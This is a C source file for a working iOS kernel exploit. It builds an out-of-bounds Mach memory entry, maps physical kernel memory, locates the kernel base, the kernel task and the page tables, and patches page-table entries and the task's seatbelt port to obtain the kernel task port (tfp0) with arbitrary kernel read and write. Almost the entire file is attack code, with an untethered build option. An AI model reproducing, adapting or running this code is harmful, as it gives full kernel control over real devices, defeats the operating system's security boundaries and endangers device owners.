#include "util.h"
#include "memory.h"
#include "oob_entry.h"

kinfo_t *kinfo = NULL;

void print_log(const char *fmt, ...) {
    static bool log_opened = false;
    if (!log_opened) {
        openlog("oob_entry", LOG_PID | LOG_CONS, LOG_USER);
        log_opened = true;
    }

    char buf[1024];
    va_list va;
    va_start(va, fmt);
    vsnprintf(buf, sizeof(buf), fmt, va);
    va_end(va);

#ifndef UNTETHER
    syslog(LOG_ERR, "%s", buf);
    fprintf(stderr, "%s", buf);
    fflush(stderr);
#else
    static int console_fd = -1;
    if (console_fd < 0) {
        console_fd = open("/dev/console", O_WRONLY | O_NOCTTY);
    }

    if (console_fd >= 0) {
        write(console_fd, buf, strlen(buf));
        if (buf[strlen(buf) - 1] != '\n') {
            write(console_fd, "\n", 1);
        }
        fsync(console_fd);
    }
#endif
}

int create_oob_entry(void) {
    uint64_t oob_size = 0xffffffffffffc000;
    uint64_t oob_offset = 0xffffffff00008000;
    vm_prot_t prot = VM_PROT_READ | VM_PROT_WRITE;
    mach_port_t task = mach_task_self();
    void *surface = NULL;
    
    if (kinfo->version[0] <= 7) {
        const char *list[] = {
            "AppleCLCD", "AppleM2CLCD", "AppleH1CLCD", "AppleMobileCLCD",
            "AppleRGBOUT", "AppleH1TVOut", "AppleRGBOUT", "AppleM2TVOut",
            "AppleMX31IPU", "ApplePinotLCD", NULL
        };

        mach_port_t service = MACH_PORT_NULL;
        mach_port_t client = MACH_PORT_NULL;
        for (uint32_t i = 0; list[i] != NULL; i++) {
            service = IOServiceGetMatchingService(0, IOServiceMatching(list[i]));
            if (MACH_PORT_VALID(service)) break;
        }

        if (!MACH_PORT_VALID(service)) return -1;
        IOMobileFramebufferOpen(service, mach_task_self(), 0, &client);

        if (!MACH_PORT_VALID(client)) return -1;
        IOMobileFramebufferGetLayerDefaultSurface(client, 0, &surface);
        if (surface == NULL) return -1;
    } else {
        CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
        CFDictionarySetValue(dict, CFSTR("IOSurfacePixelFormat"), CFNUM((int)'ARGB'));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceWidth"), CFNUM(32));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceHeight"), CFNUM(32));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBufferTileMode"), kCFBooleanFalse);
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerRow"), CFNUM(128));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceBytesPerElement"), CFNUM(4));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"), CFNUM(0x20000));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceMemoryRegion"), CFSTR("PurpleGfxMem"));
        CFDictionarySetValue(dict, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
        
        surface = IOSurfaceCreate(dict);
        CFRelease(dict);
        if (surface == NULL) return -1;
    }
    
    memory_object_size_t entry_size = 0x20000;
    memory_object_offset_t entry_base = (memory_object_offset_t)IOSurfaceGetBaseAddress(surface);
    if (kinfo->version[0] >= 8) memset((void *)entry_base, 0x41, entry_size);

    if (mach_make_memory_entry_64(task, &entry_size, entry_base, prot, &kinfo->main_entry, 0) != 0) return -1;      
    if (mach_make_memory_entry_64(task, &oob_size, oob_offset, prot, &kinfo->oob_entry, kinfo->main_entry) != 0) return -1;
    CFRelease(surface);
    return 0;
}

int remap_kernel_task(uint32_t entry_pa) {
    uint32_t kern_task_pa = kvtophys(kinfo->kern_task_addr);
    uint32_t kern_port_pa = kvtophys(kinfo->kern_port_addr);
    if (kern_task_pa == 0 || kern_port_pa == 0) return -1;

    uint32_t remap_entry = entry_pa;
    uint32_t remap_page_pa = kern_task_pa & ~0xfff;
    uint32_t remap_page_va = 0xdead0000;
    uint32_t remap_va = 0xdead0000 + (kinfo->kern_task_addr & 0xfff);
    if (physread32(kern_port_pa + 0x48) == remap_va) return 0; // ipc_port->ip_kobject

    uint32_t l1_index = (remap_page_va >> 20) & 0xfff;
    uint32_t l1_entry = kinfo->kern_tte_phys + (l1_index * 4);
    uint32_t l2_index = (remap_page_va >> 12) & 0xff;
    uint32_t l2_entry = remap_entry + (l2_index * 4);

    physwrite32(l2_entry, (remap_page_pa & 0xfffff000) | (3 << 4) | 0x2);
    physwrite32(l1_entry, (remap_entry & 0xfffffc00) | 0x1);
    usleep(10000);

    physwrite32(kern_port_pa + 0x48, remap_va);
    usleep(10000);
    return 0;
}

int run_oob_entry(bool enable_tfp0) {
    uint64_t timer = timer_start();
    kinfo = calloc(1, sizeof(kinfo_t));
    int status = -1;

    if (init_io() != 0) goto done;
    if (init_offsets() != 0) goto done;
    print_log("[*] version: %u.%u.%u\n", kinfo->version[0], kinfo->version[1], kinfo->version[2]);
    
    if (create_oob_entry() != 0) goto done;
    print_log("[*] main_entry: 0x%x\n", kinfo->main_entry);
    print_log("[*] oob_entry: 0x%x\n", kinfo->oob_entry);

    uint8_t *mapped = map_relative_data(0, 0x2000000, VM_PROT_READ);
    if (mapped == NULL) goto done;

    for (uint32_t i = 0; i < 0x1000000; i+=0x1000) {
        if (*(uint32_t *)(mapped + i) == MH_MAGIC && *(uint32_t *)(mapped + i + 0xc) == MH_EXECUTE) {
            kinfo->mapping_base = kinfo->kernel_phys_base - i;
            kinfo->kernel_base = *(uint32_t *)(mapped + i + 0x34);
            if (kinfo->version[0] >= 6) {
                kinfo->kernel_slide = kinfo->kernel_base - kinfo->kernel_static_base;
            }

            struct mach_header *hdr = (struct mach_header *)(mapped + i);
            struct load_command *load_cmd = (struct load_command *)(hdr + 1);

            for (uint32_t j = 0; j < hdr->ncmds; j++) {
                if (load_cmd->cmd == LC_SEGMENT) {
                    struct segment_command *segment = (struct segment_command *)load_cmd;

                    if (strcmp(segment->segname, "__DATA") == 0) {
                        kinfo->kern_data_pa = (kinfo->kernel_phys_base + segment->fileoff & ~0xfff);
                        kinfo->kern_data_size = ((segment->vmsize + 0xfff) & ~0xfff);
                        break;
                    }
                }
            
                if (kinfo->kern_data_pa != 0) break;
                load_cmd = (struct load_command *)((uint8_t *)load_cmd + load_cmd->cmdsize);
            }
            break;
        }
    }

    unmap_data(mapped, 0x1000000);
    if (kinfo->mapping_base == 0 || kinfo->kernel_base == 0 || kinfo->kern_data_pa == 0) goto done;
    mapped = map_data(kinfo->kern_data_pa, kinfo->kern_data_size, VM_PROT_READ);     
    if (mapped == NULL) goto done;

    print_log("[*] mapping_base: 0x%x\n", kinfo->mapping_base);
    print_log("[*] kernel_phys_base: 0x%x\n", kinfo->kernel_phys_base);
    print_log("[*] kernel_base: 0x%x\n", kinfo->kernel_base);
    print_log("[*] kernel_slide: 0x%x\n", kinfo->kernel_slide);

    for (uint32_t i = 0; i < kinfo->kern_data_size-0x100; i+=0x4) {
        if (kinfo->kern_proc_addr == 0) {
            bool found = false;
            if (*(uint32_t *)(mapped + i) == 0) {
                if (kinfo->version[0] == 10) {
                    if (*(uint32_t *)(mapped + i + koffsetof(proc, lock_type)) == 0x22000000 && *(uint32_t *)(mapped + i + koffsetof(proc, p_stat)) == 0x2 && *(uint32_t *)(mapped + i + 0x4) != 0) found = true;
                } else {
                    if (*(uint32_t *)(mapped + i + koffsetof(proc, lock_type)) == 0x22 && *(uint32_t *)(mapped + i + koffsetof(proc, p_stat)) == 0x2 && *(uint32_t *)(mapped + i + 0x4) != 0) found = true;
                }
            }
            
            if (found) {
                kinfo->kern_proc_addr = kinfo->kernel_base + i + (kinfo->kern_data_pa - kinfo->kernel_phys_base);
                kinfo->kern_task_addr = *(uint32_t *)(mapped + i + koffsetof(proc, task));
                if ((kinfo->kern_task_addr & 0x80000000) != 0x80000000) {
                    kinfo->kern_proc_addr = 0;
                    kinfo->kern_task_addr = 0;
                }
            }
        }

        if (kinfo->kern_tte_phys == 0) {
            uint32_t *data = (uint32_t *)(mapped + i);
            if (kinfo->version[0] <= 9) {
                if (kinfo->version[0] <= 5) {
                    if ((data[0] & 0x80000000) == 0x80000000 && data[0] != data[1] &&
                        (data[0] & 0xffff) == (data[1] & 0xffff) && data[2] == 0x1000) {
                        kinfo->kern_tte_phys = data[1];
                    }
                } else {
                    if ((data[0] & 0x80000000) == 0x80000000 && data[0] != data[1] &&
                        (data[0] & 0xffff) == (data[1] & 0xffff) && data[2] == 0 && data[3] == 0xfffeffff) {
                        kinfo->kern_tte_phys = data[1];
                    }
                }
            } else {
                if (data[0] == PAGE_SIZE && data[1] == PAGE_MASK && data[2] == PAGE_SHIFT) {
                    for (uint32_t j = 0; j < 0x100; j++) {
                        if ((data[j] & 0x80000000) == 0x80000000 && data[j] != data[j+1] &&
                            (data[j] & 0xffff) == (data[j+1] & 0xffff)) {
                            kinfo->kern_tte_phys = data[j+1];
                            break;
                        }
                    }
                }
            }
        }
        if (kinfo->kern_proc_addr != 0 && kinfo->kern_tte_phys != 0) break;
    }


    if (kinfo->kern_proc_addr == 0 || kinfo->kern_task_addr == 0 || kinfo->kern_tte_phys == 0) goto done;
    kinfo->kern_port_addr = kread32(kinfo->kern_task_addr + koffsetof(task, itk_self));
    if (kinfo->kern_port_addr == 0) goto done;

    print_log("[*] kern_proc_addr: 0x%x\n", kinfo->kern_proc_addr);
    print_log("[*] kern_task_addr: 0x%x\n", kinfo->kern_task_addr);
    print_log("[*] kern_port_addr: 0x%x\n", kinfo->kern_port_addr);
    print_log("[*] kern_tte_phys: 0x%x\n", kinfo->kern_tte_phys);

    for (uint32_t i = 0; i < 100; i++) {
        if (kinfo->self_proc_addr == 0) {
            uint32_t current_proc = kinfo->kern_proc_addr;
            pid_t self_pid = getpid();
            
            while (current_proc != 0) {
                pid_t current_pid = kread32(current_proc + koffsetof(proc, pid));
                if (current_pid == self_pid) {
                    kinfo->self_proc_addr = current_proc;
                    break;
                }
                current_proc = kread32(current_proc + 0x4);
            }
        }
   
        if (kinfo->self_proc_addr != 0 && kinfo->self_task_addr == 0) {
            kinfo->self_task_addr = kread32(kinfo->self_proc_addr + koffsetof(proc, task));
        }

        if (kinfo->self_task_addr != 0 && kinfo->self_proc_addr != 0) break;
        usleep(1000);
        mem_sync();
    }
    
    if (kinfo->self_proc_addr == 0 || kinfo->self_task_addr == 0) goto done;
    print_log("[*] self_task_addr: 0x%x\n", kinfo->self_task_addr);
    print_log("[*] self_proc_addr: 0x%x\n", kinfo->self_proc_addr);

    if (enable_tfp0) {
        if (kinfo->version[0] == 10 && kinfo->version[1] == 3) {
            if (remap_kernel_task(kinfo->mapping_base + 0x40000) != 0) goto done;
        }

        uint32_t seatbelt_addr = kread32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt));
        while (1) {
            kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), kinfo->kern_port_addr);
            usleep(1000);

            task_get_special_port(mach_task_self(), TASK_SEATBELT_PORT, &kinfo->tfp0);
            if (MACH_PORT_VALID(kinfo->tfp0)) break;
        }

        kwrite32(kinfo->self_task_addr + koffsetof(task, itk_seatbelt), seatbelt_addr);
        print_log("[*] tfp0: 0x%x\n", kinfo->tfp0);

        uint32_t test_alloc = kalloc(0x1000);
        print_log("[*] test_alloc: 0x%x\n", test_alloc);
        if (test_alloc == 0) goto done;
        
        kwrite32(test_alloc, 0x41414141);
        uint32_t test_read = kread32(test_alloc);
        print_log("[*] test_read: 0x%x\n", test_read);

        kfree(test_alloc, 0x1000);
        kwrite32(kinfo->kern_port_addr + koffsetof(ipc_port, ip_references), 0x414141);
        kwrite32(kinfo->kern_task_addr + koffsetof(task, ref_count), 0x424242);
    }

    print_log("[*] done in %llu ms\n", timer_end(timer));
    status = 0;

done:
    if (status == 0) return 0;
    if (kinfo != NULL) {
        if (MACH_PORT_VALID(kinfo->oob_entry)) mach_port_deallocate(mach_task_self(), kinfo->oob_entry);
        if (MACH_PORT_VALID(kinfo->main_entry)) mach_port_deallocate(mach_task_self(), kinfo->main_entry);
        if (MACH_PORT_VALID(kinfo->tfp0)) mach_port_deallocate(mach_task_self(), kinfo->tfp0);
        free(kinfo);
        kinfo = NULL;
    }
    
    print_log("[-] exploit failed\n");
    return -1;
}
